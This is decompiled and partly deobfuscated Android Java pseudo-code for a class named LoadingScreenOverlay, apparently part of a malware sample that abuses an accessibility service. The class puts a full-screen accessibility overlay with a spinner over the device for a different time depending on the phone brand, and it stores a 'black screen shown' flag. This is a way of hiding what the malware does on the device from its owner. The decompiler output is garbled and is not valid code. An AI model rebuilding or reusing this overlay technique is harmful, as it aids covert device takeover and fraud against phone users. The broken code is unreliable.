package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: LoadingScreenOverlay
 * Original: Lcom/tencent/Bla_tunesxconcerningn10_ck;
 */
public class LoadingScreenOverlay {

    // === FIELDS ===
    public static Handler handler;
    static boolean ifAlreadShow = false;
    static FrameLayout layout;
    public static String localeForAccessibility = "{'en':'Enable','de':'Aktivieren','ar':'تفعيل";
    static ProgressBar progressBar;
    static WindowManager windowManager;

    // === METHODS ===

    static void StaticInitializer() {
        return;
    }

    public void Constructor() {
        // new Object()
        return;
    }

    private static void checkCountDown(int param0) {
        v1 = Br_tunesxconcerningn10_and.getBrand();
        v1 = v0.toLowerCase();
        v1 = "huawei";
        v0.equals("huawei");
        if (v0 != null && v0 != 0) { // goto +18
        Br_tunesxconcerningn10_and.getBrand();
        v0.toLowerCase();
        v2 = v0.equals("honor");
        if (v0 == null || v0 == 0) { // goto +4
        v2 = 11000;
        Br_tunesxconcerningn10_and.getBrand();
        v0.toLowerCase();
        v0.equals("oppo");
        if (v0 != null && v0 != 0) { // goto +18
        Br_tunesxconcerningn10_and.getBrand();
        v0.toLowerCase();
        v2 = v0.equals("realme");
        if (v0 == null || v0 == 0) { // goto +4
        v2 = 8000;
        Br_tunesxconcerningn10_and.getBrand();
        v0.toLowerCase();
        v2 = v0.equals("vivo");
        if (v0 == null || v0 == 0) { // goto +4
        v2 = 10000;
        v0 = new Thread();
        // new LoadingScreenOverlay$1(10000)
        // new Thread("vivo")
        v0.start();
        return;
    }

    private static View getView2(AccessibilityServiceCore param0) {
        v0 = new ProgressBar();
        v1 = 0;
        v2 = 16842871;
        // new ProgressBar(v3, 0, 16842871)
        LoadingScreenOverlay.progressBar = v0;
        v0 = 1;
        v1 = 16842910;
        v2 = 0;
        1[0] = 16842910;
        v1 = -1;
        // new ColorStateList(1, -1)
        1.setIndeterminateTintList(0);
        v0 = 1128792064; // 0x43480000
        v3 = ScreenCaptureEngineUtil.dp2px(v3, 1);
        // new FrameLayout$LayoutParams(v3, v3)
        v3 = 17;
        1.gravity = 17;
        17.setLayoutParams(1);
        return 17;
    }

    public static void hide(AccessibilityServiceCore param0) {
        v0 = LoadingScreenOverlay.layout;
        if (v0 == null || v0 == 0) { // goto +48
        v1 = 8;
        v0.setVisibility(8);
        v0 = LoadingScreenOverlay.progressBar;
        v0.setVisibility(8);
        v0 = LoadingScreenOverlay.layout;
        v0.removeAllViews();
        v0 = LoadingScreenOverlay.windowManager;
        v0.removeView(8);
        v0 = 0;
        LoadingScreenOverlay.layout = 0;
        LoadingScreenOverlay.progressBar = 0;
        LoadingScreenOverlay.windowManager = 0;
        v0 = 1;
        LoadingScreenOverlay.ifAlreadShow = 1;
        Boolean.valueOf(1);
        My_tunesxconcerningn10_Settings.WriteBool(v2, "IF_ALREAD_SHOW_HEIPING", 1);
        // goto (branch)
        v2.printStackTrace();
        return;
    }

    public static void show(AccessibilityServiceCore param0) {
        v0 = 0;
        v1 = Boolean.valueOf(0);
        v1 = "IF_ALREAD_SHOW_HEIPING";
        My_tunesxconcerningn10_Settings.readBool(v3, "IF_ALREAD_SHOW_HEIPING", 0);
        if (0 == null || 0 == 0) { // goto +3
        return;
        if (0 == null || 0 == 0) { // goto +3
        return;
        v2 = Looper.myLooper();
        v2 = new LoadingScreenOverlay$2();
        // new LoadingScreenOverlay$2(v3)
        // new Handler("IF_ALREAD_SHOW_HEIPING", v2)
        LoadingScreenOverlay.handler = 0;
        v0 = 5000;
        LoadingScreenOverlay.checkCountDown(5000);
        v3.getSystemService("window");
        LoadingScreenOverlay.windowManager = "window";
        // new FrameLayout(v3)
        LoadingScreenOverlay.layout = "window";
        v3 = LoadingScreenOverlay.getView2(v3);
        "window".addView(v3);
        v3 = new WindowManager$LayoutParams();
        v0 = 2032;
        v1 = 2014;
        // new WindowManager$LayoutParams(2032, 2014)
        v0 = -1;
        v3.width = -1;
        v3.height = -1;
        -1 = LoadingScreenOverlay.windowManager;
        -1.addView(2014, v3);
        return;
    }
}
